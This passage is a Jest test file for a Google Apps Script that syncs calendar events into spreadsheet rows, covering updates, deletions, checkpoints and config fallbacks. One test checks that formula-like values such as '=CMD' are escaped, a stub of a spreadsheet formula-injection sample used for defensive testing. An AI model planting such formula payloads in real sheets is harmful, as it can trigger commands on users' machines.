const { installGlobals, resetAll, createCalendarEvent } = require('../../../test-utils/mocks');
const { eventToRow, syncCalendarToSheet, rowsEqual, rowsToMap } = require('../src/index');

beforeEach(() => {
  installGlobals(global);
  // prepare sheet header
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');
  sheet.__setHeader(['id','title','start','end','description','location','attendees']);
});

afterEach(() => resetAll(global));

test('eventToRow includes attendees and dates', () => {
  const evt = createCalendarEvent({ id: 'e1', title: 'Meeting', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'desc', location: 'HQ', attendees: ['a@example.com','b@example.com'] });
  const row = eventToRow(evt);
  expect(row[0]).toBe('e1');
  expect(row[1]).toBe('Meeting');
  expect(row[2]).toBe(new Date('2026-02-02T10:00:00Z').toISOString());
  expect(row[6]).toBe('a@example.com,b@example.com');
});

test('syncCalendarToSheet adds, updates, and deletes rows correctly', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  // Add events
  const evt1 = createCalendarEvent({ id: 'e1', title: 'Meeting A', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd1', location: 'L1', attendees: ['a@example.com'] });
  const evt2 = createCalendarEvent({ id: 'e2', title: 'Meeting B', start: new Date('2026-02-02T12:00:00Z'), end: new Date('2026-02-02T13:00:00Z'), description: 'd2', location: 'L2', attendees: [] });
  calendar.__addEvent(evt1);
  calendar.__addEvent(evt2);

  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-03') });

  const rows = sheet.__getRows();
  expect(rows.length).toBe(2);
  expect(rows[0][0]).toBe('e1');
  expect(rows[1][0]).toBe('e2');

  // Update evt1 title and attendees
  const evt1b = createCalendarEvent({ id: 'e1', title: 'Meeting A updated', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd1', location: 'L1', attendees: ['a@example.com','c@example.com'] });
  calendar.__reset();
  calendar.__addEvent(evt1b);
  calendar.__addEvent(evt2);

  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-03') });

  const rows2 = sheet.__getRows();
  expect(rows2.length).toBe(2);
  const e1row = rows2.find(r => r[0] === 'e1');
  expect(e1row[1]).toBe('Meeting A updated');
  expect(e1row[6]).toBe('a@example.com,c@example.com');

  // Remove evt2
  calendar.__reset();
  calendar.__addEvent(evt1b);
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-03') });
  const rows3 = sheet.__getRows();
  expect(rows3.length).toBe(1);
  expect(rows3[0][0]).toBe('e1');
});

test('rowsToMap builds correct mapping and rowsEqual works', () => {
  const rows = [['e1','a'], ['e2','b']];
  const m = rowsToMap(rows);
  expect(m.has('e1')).toBe(true);
  expect(m.get('e2').rowIndex).toBe(3); // header row considered
  expect(rowsEqual(['a','b'], ['a','b'])).toBe(true);
  expect(rowsEqual(['a','b'], ['a','c'])).toBe(false);
  // extra trailing columns in b are ignored
  expect(rowsEqual(['a','b'], ['a','b','extra','columns'])).toBe(true);
  expect(rowsEqual(['a','b'], ['a','c','extra','columns'])).toBe(false);
});

test('rowsEqual handles Date objects and escaped strings', () => {
  const isoString = '2026-02-02T10:00:00.000Z';
  const dateObj = new Date(isoString);

  // Date comparison (ISO string from event vs Date object from sheet)
  expect(rowsEqual([isoString], [dateObj])).toBe(true);
  expect(rowsEqual([isoString], [new Date('2026-02-02T11:00:00.000Z')])).toBe(false);

  // Escaped string comparison (Sanitized string vs Raw string from sheet)
  expect(rowsEqual(["'=SUM(1,2)"], ["=SUM(1,2)"])).toBe(true);
  expect(rowsEqual(["'=SUM(1,2)"], ["=SUM(3,4)"])).toBe(false);
  expect(rowsEqual(['id', isoString, "'=CMD"], ['id', dateObj, "=CMD"])).toBe(true);
});

test('eventToRow handles missing optional fields', () => {
  const evt = createCalendarEvent({ id: 'e3', title: 'No extras', start: new Date('2026-02-03T10:00:00Z'), end: new Date('2026-02-03T11:00:00Z') });
  const row = eventToRow(evt);
  expect(row[4]).toBe(''); // description
  expect(row[5]).toBe(''); // location
  expect(row[6]).toBe(''); // attendees
});

test('syncCalendarToSheet skips update when rows are equal', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  const evt = createCalendarEvent({ id: 'e4', title: 'Stable meeting', start: new Date('2026-02-04T10:00:00Z'), end: new Date('2026-02-04T11:00:00Z'), description: 'x', location: 'L', attendees: [] });
  calendar.__addEvent(evt);
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-06') });
  const before = JSON.stringify(sheet.__getRows());
  // No changes
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-06') });
  const after = JSON.stringify(sheet.__getRows());
  expect(before).toBe(after);
});

test('syncCalendarToSheet ignores extra user columns when comparing rows', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  const evt = createCalendarEvent({ id: 'e_extra', title: 'Meeting with notes', start: new Date('2026-02-04T10:00:00Z'), end: new Date('2026-02-04T11:00:00Z'), description: 'desc', location: 'L', attendees: ['a@example.com'] });
  calendar.__addEvent(evt);
  
  // First sync
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-06') });
  
  // Simulate user adding extra columns (notes) to the row
  const rows = sheet.__getRows();
  const targetRow = rows.find(r => r[0] === 'e_extra');
  targetRow.push('User note 1', 'User note 2', 'Extra data');
  
  // Second sync - should NOT update the row because script-owned columns are identical
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-06') });
  
  const rowsAfter = sheet.__getRows();
  const rowAfter = rowsAfter.find(r => r[0] === 'e_extra');
  
  // User notes should still be there (row was not rewritten)
  expect(rowAfter.length).toBeGreaterThan(7); // more than the 7 script columns
  expect(rowAfter[7]).toBe('User note 1');
  expect(rowAfter[8]).toBe('User note 2');
  expect(rowAfter[9]).toBe('Extra data');
});

test('rowsToMap skips empty rows and sync uses default date range', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  // Put some invalid rows in sheet data
  sheet.__getRows().push([null]);
  sheet.__getRows().push([]);

  const m = rowsToMap(sheet.__getRows());
  expect(m.has(null)).toBe(false);

  // Add an event and call sync without start/end to use defaults
  const evt = createCalendarEvent({ id: 'e5', title: 'Default range', start: new Date(), end: new Date(Date.now()+3600000) });
  calendar.__addEvent(evt);
  await syncCalendarToSheet(calendar, sheet);
  const rows = sheet.__getRows();
  expect(rows.find(r => r[0] === 'e5')).toBeTruthy();
});

test('eventToRow handles null guest list and sync handles empty data array', async () => {
  // eventToRow with null guest list
  const evt = { getId: () => 'enul', getTitle: () => 'NoGuests', getStartTime: () => new Date('2026-02-05T10:00:00Z'), getEndTime: () => new Date('2026-02-05T11:00:00Z'), getDescription: () => null, getLocation: () => null, getGuestList: () => null };
  const row = eventToRow(evt);
  expect(row[6]).toBe('');

  // sync with a sheet that returns empty getValues array
  const calendar = CalendarApp.getDefaultCalendar();
  calendar.__reset();
  calendar.__addEvent(createCalendarEvent({ id: 'enul', title: 'NoGuests', start: new Date(), end: new Date(Date.now()+1000) }));

  const sheet = {
    getDataRange: () => ({ getValues: () => [] }),
    appendRow: (r) => { sheet._rows = sheet._rows || []; sheet._rows.push(r); },
    getRange: () => ({ setValues: () => {} }),
    deleteRow: () => {},
    __getRows: () => sheet._rows || []
  };

  await syncCalendarToSheet(calendar, sheet);
  expect(sheet.__getRows().find(r => r[0] === 'enul')).toBeTruthy();
});

test('syncCalendarToSheet deletes multiple rows and calls sort comparator', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  // pre-populate sheet with two rows that have dates within the sync window
  const start = new Date('2026-02-01');
  const end = new Date('2026-02-03');
  sheet.__getRows().push(['x1', 'A', start.toISOString(), end.toISOString()]);
  sheet.__getRows().push(['x2', 'B', start.toISOString(), end.toISOString()]);

  // ensure calendar is empty
  calendar.__reset();

  await syncCalendarToSheet(calendar, sheet, { start, end });

  expect(sheet.__getRows().length).toBe(0);
});

// Ensure the GAS wrapper can sync multiple configs in SYNC_CONFIGS
test('syncAllCalendarsToSheetsGAS syncs multiple configs to multiple sheets', async () => {
  const code = require('../code.gs');

  // Use two configs pointing at the same spreadsheet but different sheets
  global.SYNC_CONFIGS = [
    { spreadsheetId: 'ss1', sheetName: 'SheetA', calendarId: '' },
    { spreadsheetId: 'ss1', sheetName: 'SheetB', calendarId: '' }
  ];

  const ss = SpreadsheetApp.openById('ss1');
  const sheetA = ss.getSheetByName('SheetA');
  const sheetB = ss.getSheetByName('SheetB');
  sheetA.__setHeader(['id','title','start','end','description','location','attendees']);
  sheetB.__setHeader(['id','title','start','end','description','location','attendees']);

  const calendar = CalendarApp.getDefaultCalendar();
  const evt = createCalendarEvent({ id: 'em', title: 'MultiEvent', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd', location: 'L', attendees: [] });
  calendar.__addEvent(evt);

  await code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');

  expect(sheetA.__getRows().find(r => r[0] === 'em')).toBeTruthy();
  expect(sheetB.__getRows().find(r => r[0] === 'em')).toBeTruthy();

  delete global.SYNC_CONFIGS;
});

// Test checkpoint logic for avoiding reprocessing old events
describe('Checkpoint logic (GAS only)', () => {
  beforeEach(() => {
    installGlobals(global);
  });

  afterEach(() => resetAll(global));

  test('getCheckpointKey returns consistent key for config', () => {
    const code = require('../code.gs');
    const cfg = { calendarId: 'cal123' };
    const key = code.getCheckpointKey(cfg);
    expect(key).toBe('calendar_to_sheets_last_sync_cal123');
  });

  test('getLastSyncTime defaults to epoch on first run', () => {
    const code = require('../code.gs');
    const cfg = { calendarId: 'new_cal' };
    const lastSync = code.getLastSyncTime(cfg);
    // Should be epoch
    expect(lastSync.getTime()).toBe(0);
    expect(lastSync.toISOString()).toBe('1970-01-01T00:00:00.000Z');
  });

  test('saveLastSyncTime and getLastSyncTime persist checkpoint', () => {
    const code = require('../code.gs');
    const cfg = { calendarId: 'cal456' };
    const testTime = new Date('2026-01-15T10:00:00Z');
    
    code.saveLastSyncTime(cfg, testTime);
    const retrieved = code.getLastSyncTime(cfg);
    
    expect(retrieved.getTime()).toBe(testTime.getTime());
  });

  test('clearCheckpoint removes saved sync time', () => {
    const code = require('../code.gs');
    const cfg = { calendarId: 'cal789' };
    const testTime = new Date('2026-01-15T10:00:00Z');
    
    code.saveLastSyncTime(cfg, testTime);
    code.clearCheckpoint(cfg);
    
    const retrieved = code.getLastSyncTime(cfg);
    // Should be reset to epoch
    expect(retrieved.getTime()).toBe(0);
    expect(retrieved.toISOString()).toBe('1970-01-01T00:00:00.000Z');
  });

  test('getLastSyncTime resets invalid checkpoint to epoch', () => {
    const code = require('../code.gs');
    const cfg = { calendarId: 'cal_invalid' };
    
    // Simulate various corrupted checkpoint values
    const key = code.getCheckpointKey(cfg);
    
    // Test with NaN-producing values
    const invalidValues = ['NaN', 'null', 'undefined', 'invalid', '', 'abc123'];
    
    for (const invalidValue of invalidValues) {
      PropertiesService.getUserProperties().setProperty(key, invalidValue);
      const retrieved = code.getLastSyncTime(cfg);
      
      // Should reset to epoch (beginning of time)
      expect(retrieved.getTime()).toBe(0);
      expect(retrieved.toISOString()).toBe('1970-01-01T00:00:00.000Z');
    }
    
    // Test with a very large invalid number that creates Invalid Date
    PropertiesService.getUserProperties().setProperty(key, '999999999999999999');
    const retrieved2 = code.getLastSyncTime(cfg);
    expect(retrieved2.getTime()).toBe(0);
  });

  test('syncCalendarToSheetGAS syncs in 1-year chunks with checkpoints', () => {
    const code = require('../code.gs');
    
    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    
    // Add events across multiple years
    const evt2024 = createCalendarEvent({ 
      id: 'e_2024', 
      title: 'Event 2024', 
      start: new Date('2024-06-01T10:00:00Z'), 
      end: new Date('2024-06-01T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    const evt2025 = createCalendarEvent({ 
      id: 'e_2025', 
      title: 'Event 2025', 
      start: new Date('2025-06-01T10:00:00Z'), 
      end: new Date('2025-06-01T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    const evt2026 = createCalendarEvent({ 
      id: 'e_2026', 
      title: 'Event 2026', 
      start: new Date('2026-01-15T10:00:00Z'), 
      end: new Date('2026-01-15T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    
    calendar.__addEvent(evt2024);
    calendar.__addEvent(evt2025);
    calendar.__addEvent(evt2026);
    
    // Sync from 2024-01-01 to 2026-02-01 (over 2 years)
    code.syncCalendarToSheetGAS('2024-01-01', '2026-02-01');
    
    // All events should be synced
    const rows = sheet.__getRows();
    expect(rows.length).toBe(3);
    expect(rows.find(r => r[0] === 'e_2024')).toBeTruthy();
    expect(rows.find(r => r[0] === 'e_2025')).toBeTruthy();
    expect(rows.find(r => r[0] === 'e_2026')).toBeTruthy();
    
    // Checkpoint should be at the end date
    const cfg = code.getConfig();
    const lastSync = code.getLastSyncTime(cfg);
    expect(lastSync.toISOString()).toBe('2026-02-01T00:00:00.000Z');
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('syncCalendarToSheetGAS saves checkpoint after successful sync', () => {
    const code = require('../code.gs');
    
    // Clear any existing config
    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e1', title: 'Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd', location: 'L', attendees: [] });
    calendar.__addEvent(evt);

    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');

    const cfg = code.getConfig();
    const lastSync = code.getLastSyncTime(cfg);
    // Checkpoint should be saved as the end date parameter
    expect(lastSync.toISOString()).toBe('2026-02-03T00:00:00.000Z');
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
  });

  test('syncCalendarToSheetGAS expands recent start by one window', () => {
    const code = require('../code.gs');

    jest.useFakeTimers();
    jest.setSystemTime(new Date('2026-02-07T00:00:00Z'));

    try {
      delete global.SYNC_CONFIGS;
      delete global.SPREADSHEET_ID;
      delete global.SHEET_NAME;
      delete global.CALENDAR_ID;

      global.SPREADSHEET_ID = 'ss1';
      global.SHEET_NAME = 'Sheet1';

      const ss = SpreadsheetApp.openById('ss1');
      const sheet = ss.getSheetByName('Sheet1');
      sheet.__setHeader(['id','title','start','end','description','location','attendees']);

      const calendar = CalendarApp.getDefaultCalendar();
      const evt = createCalendarEvent({
        id: 'e_recent_window',
        title: 'Recent Window Event',
        start: new Date('2025-06-01T10:00:00Z'),
        end: new Date('2025-06-01T11:00:00Z'),
        description: 'd',
        location: 'L',
        attendees: []
      });
      calendar.__addEvent(evt);

      code.syncCalendarToSheetGAS('2026-01-15', '2026-02-01');

      expect(sheet.__getRows().find(r => r[0] === 'e_recent_window')).toBeTruthy();
    } finally {
      jest.useRealTimers();
      delete global.SPREADSHEET_ID;
      delete global.SHEET_NAME;
      delete global.CALENDAR_ID;
    }
  });

  test('syncCalendarToSheetGAS resets checkpoint when start is in the future', () => {
    const code = require('../code.gs');
    
    // Clear any existing config
    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e_future', title: 'Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd', location: 'L', attendees: [] });
    calendar.__addEvent(evt);

    const cfg = code.getConfig();
    // Set checkpoint to a future date (simulating old bug where end dates were saved)
    const futureDate = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 1 year in future
    code.saveLastSyncTime(cfg, futureDate);

    // Call without date parameters to trigger checkpoint validation
    code.syncCalendarToSheetGAS();

    // Verify checkpoint was reset to reasonable past date
    const lastSync = code.getLastSyncTime(cfg);
    const now = Date.now();
    expect(lastSync.getTime()).toBeLessThanOrEqual(now);
    expect(lastSync.getTime()).toBeGreaterThan(now - 10000); // Should be very recent (just reset)
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
  });

  test('syncAllCalendarsToSheetsGAS handles errors and continues with other calendars', () => {
    const code = require('../code.gs');
    
    global.SYNC_CONFIGS = [
      { spreadsheetId: 'ss1', sheetName: 'SheetA', calendarId: 'cal1' },
      { spreadsheetId: 'ss1', sheetName: 'SheetB', calendarId: 'cal2' }
    ];

    const ss = SpreadsheetApp.openById('ss1');
    const sheetA = ss.getSheetByName('SheetA');
    const sheetB = ss.getSheetByName('SheetB');
    sheetA.__setHeader(['id','title','start','end','description','location','attendees']);
    sheetB.__setHeader(['id','title','start','end','description','location','attendees']);

    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e2', title: 'Test2', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd', location: 'L', attendees: [] });
    calendar.__addEvent(evt);

    // Mock Logger for error handling
    global.Logger = { log: jest.fn() };

    code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');

    // Both sheets should have the event
    expect(sheetA.__getRows().find(r => r[0] === 'e2')).toBeTruthy();
    expect(sheetB.__getRows().find(r => r[0] === 'e2')).toBeTruthy();

    delete global.SYNC_CONFIGS;
    delete global.Logger;
  });

  test('syncAllCalendarsToSheetsGAS resets checkpoint when start is in the future', () => {
    const code = require('../code.gs');
    
    global.SYNC_CONFIGS = [
      { spreadsheetId: 'ss1', sheetName: 'SheetA', calendarId: 'cal1' }
    ];

    const ss = SpreadsheetApp.openById('ss1');
    const sheetA = ss.getSheetByName('SheetA');
    sheetA.__setHeader(['id','title','start','end','description','location','attendees']);

    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e_future_multi', title: 'Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd', location: 'L', attendees: [] });
    calendar.__addEvent(evt);

    // Set checkpoint to a future date (simulating old bug where end dates were saved)
    const futureDate = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 1 year in future
    code.saveLastSyncTime(global.SYNC_CONFIGS[0], futureDate);

    // Call without date parameters to trigger checkpoint validation
    code.syncAllCalendarsToSheetsGAS();

    // Verify checkpoint was reset to reasonable past date
    const lastSync = code.getLastSyncTime(global.SYNC_CONFIGS[0]);
    const now = Date.now();
    expect(lastSync.getTime()).toBeLessThanOrEqual(now);
    expect(lastSync.getTime()).toBeGreaterThan(now - 10000); // Should be very recent (just reset)
    
    // Verify event was synced
    expect(sheetA.__getRows().find(r => r[0] === 'e_future_multi')).toBeTruthy();

    delete global.SYNC_CONFIGS;
  });
  test('syncAllCalendarsToSheetsGAS without dates uses checkpoints', async () => {
    const code = require('../code.gs');
    
    global.SYNC_CONFIGS = [
      { spreadsheetId: 'ss1', sheetName: 'SheetA', calendarId: '' }
    ];

    const ss = SpreadsheetApp.openById('ss1');
    const sheetA = ss.getSheetByName('SheetA');
    sheetA.__setHeader(['id','title','start','end','description','location','attendees']);

    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e_checkpoint', 
      title: 'CheckpointTest', 
      start: new Date(), 
      end: new Date(Date.now() + 3600000)
    });
    calendar.__addEvent(evt);

    // Call without dates to trigger checkpoint logic (line 138)
    await code.syncAllCalendarsToSheetsGAS();

    // Sheet should have the event
    expect(sheetA.__getRows().find(r => r[0] === 'e_checkpoint')).toBeTruthy();

    delete global.SYNC_CONFIGS;
  });
  test('fullResyncCalendarToSheetGAS clears checkpoint and syncs', () => {
    const code = require('../code.gs');
    
    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: 'cal1' }];

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);

    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e3', title: 'Test3', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: 'd', location: 'L', attendees: [] });
    calendar.__addEvent(evt);

    // Set a checkpoint first
    const cfg = code.getConfigs()[0];
    code.saveLastSyncTime(cfg, new Date('2025-01-01'));

    // Full resync
    code.fullResyncCalendarToSheetGAS(0);

    // Should have synced and updated checkpoint
    const lastSync = code.getLastSyncTime(cfg);
    expect(lastSync.getTime()).toBeGreaterThan(new Date('2026-01-01').getTime());

    delete global.SYNC_CONFIGS;
  });

  test('fullResyncCalendarToSheetGAS deletes rows for a specific config', () => {
    const code = require('../code.gs');

    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    sheet.__getRows().push(['old1'], ['old2']);
    sheet.deleteRows = jest.fn();

    code.fullResyncCalendarToSheetGAS(0);

    expect(sheet.deleteRows).toHaveBeenCalledWith(2, 2);

    delete global.SYNC_CONFIGS;
  });

  test('fullResyncCalendarToSheetGAS deletes rows for all configs', () => {
    const code = require('../code.gs');

    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    sheet.__getRows().push(['old1'], ['old2']);
    sheet.deleteRows = jest.fn();

    code.fullResyncCalendarToSheetGAS();

    expect(sheet.deleteRows).toHaveBeenCalledWith(2, 2);

    delete global.SYNC_CONFIGS;
  });

  test('fullResyncCalendarToSheetGAS logs errors when clearing configs', () => {
    const code = require('../code.gs');

    global.SYNC_CONFIGS = [
      { spreadsheetId: 'invalid_ss', sheetName: 'BadSheet', calendarId: 'bad_cal' }
    ];

    const originalOpenById = SpreadsheetApp.openById;
    SpreadsheetApp.openById = jest.fn(() => {
      throw new Error('Spreadsheet not found');
    });

    global.Logger = { log: jest.fn() };

    expect(() => {
      code.fullResyncCalendarToSheetGAS();
    }).not.toThrow();

    expect(global.Logger.log).toHaveBeenCalled();

    SpreadsheetApp.openById = originalOpenById;
    delete global.SYNC_CONFIGS;
    delete global.Logger;
  });

  test('tail merge avoids a tiny trailing chunk', () => {
    const code = require('../code.gs');

    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;

    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);

    const props = PropertiesService.getUserProperties();
    const originalGetUserProperties = PropertiesService.getUserProperties;
    PropertiesService.getUserProperties = () => props;
    const setPropSpy = jest.spyOn(props, 'setProperty');

    const startIso = '2025-01-01T00:00:00.000Z';
    const endIso = new Date(new Date(startIso).getTime() + (365 * 24 * 60 * 60 * 1000) + (5 * 60 * 1000)).toISOString();

    code.syncCalendarToSheetGAS(startIso, endIso);

    expect(setPropSpy).toHaveBeenCalledTimes(1);

    setPropSpy.mockRestore();
    PropertiesService.getUserProperties = originalGetUserProperties;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('tail merge avoids a tiny trailing chunk for multi-config sync', () => {
    const code = require('../code.gs');

    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);

    const props = PropertiesService.getUserProperties();
    const originalGetUserProperties = PropertiesService.getUserProperties;
    PropertiesService.getUserProperties = () => props;
    const setPropSpy = jest.spyOn(props, 'setProperty');

    const startIso = '2025-01-01T00:00:00.000Z';
    const endIso = new Date(new Date(startIso).getTime() + (365 * 24 * 60 * 60 * 1000) + (5 * 60 * 1000)).toISOString();

    code.syncAllCalendarsToSheetsGAS(startIso, endIso);

    expect(setPropSpy).toHaveBeenCalledTimes(1);

    setPropSpy.mockRestore();
    PropertiesService.getUserProperties = originalGetUserProperties;
    delete global.SYNC_CONFIGS;
  });

  test('syncCalendarToSheetGAS logs warning when max iterations reached', () => {
    const code = require('../code.gs');

    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;

    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';

    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});

    const start = new Date('1900-01-01T00:00:00.000Z');
    const end = new Date(start.getTime() + (365 * 24 * 60 * 60 * 1000) * 101);

    code.syncCalendarToSheetGAS(start.toISOString(), end.toISOString());

    expect(logSpy).toHaveBeenCalledWith('[syncCalendarToSheetGAS] Warning: reached maximum iteration limit');

    logSpy.mockRestore();
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('syncAllCalendarsToSheetsGAS logs warning when max iterations reached', () => {
    const code = require('../code.gs');

    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];

    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});

    const start = new Date('1900-01-01T00:00:00.000Z');
    const end = new Date(start.getTime() + (365 * 24 * 60 * 60 * 1000) * 101);

    code.syncAllCalendarsToSheetsGAS(start.toISOString(), end.toISOString());

    expect(logSpy).toHaveBeenCalledWith('[syncAllCalendarsToSheetsGAS] Warning: reached maximum iteration limit for calendar', '');

    logSpy.mockRestore();
    delete global.SYNC_CONFIGS;
  });

  test('getConfigs returns legacy single config when SYNC_CONFIGS not defined', () => {
    // Clear existing configs
    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
    
    global.SPREADSHEET_ID = 'legacy_ss';
    global.SHEET_NAME = 'LegacySheet';
    global.CALENDAR_ID = 'legacy_cal';

    // Clear require cache to force re-evaluation
    delete require.cache[require.resolve('../code.gs')];
    const freshCode = require('../code.gs');
    
    const configs = freshCode.getConfigs();
    
    expect(configs.length).toBe(1);
    expect(configs[0].spreadsheetId).toBe('legacy_ss');
    expect(configs[0].sheetName).toBe('LegacySheet');
    expect(configs[0].calendarId).toBe('legacy_cal');

    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;
  });

  test('getConfigs returns defaults when legacy vars are undefined', () => {
    // Clear all configs
    delete global.SYNC_CONFIGS;
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.CALENDAR_ID;

    delete require.cache[require.resolve('../code.gs')];
    const freshCode = require('../code.gs');
    
    const configs = freshCode.getConfigs();
    
    expect(configs.length).toBe(1);
    expect(configs[0].spreadsheetId).toBe(null);
    expect(configs[0].sheetName).toBe('Sheet1');
    expect(configs[0].calendarId).toBe(null);
  });

  test('getConfigs handles non-array SYNC_CONFIGS', () => {
    delete global.SYNC_CONFIGS;
    global.SYNC_CONFIGS = 'not_an_array';

    delete require.cache[require.resolve('../code.gs')];
    const freshCode = require('../code.gs');
    
    const configs = freshCode.getConfigs();
    
    // Should fall back to legacy mode
    expect(configs.length).toBe(1);
    expect(configs[0].sheetName).toBe('Sheet1');
    
    delete global.SYNC_CONFIGS;
  });

  test('getConfigs handles empty array SYNC_CONFIGS', () => {
    delete global.SYNC_CONFIGS;
    global.SYNC_CONFIGS = [];

    delete require.cache[require.resolve('../code.gs')];
    const freshCode = require('../code.gs');
    
    const configs = freshCode.getConfigs();
    
    // Should fall back to legacy mode when array is empty
    expect(configs.length).toBe(1);
    expect(configs[0].sheetName).toBe('Sheet1');
    expect(configs[0].spreadsheetId).toBe(null);
    expect(configs[0].calendarId).toBe(null);
    
    delete global.SYNC_CONFIGS;
  });

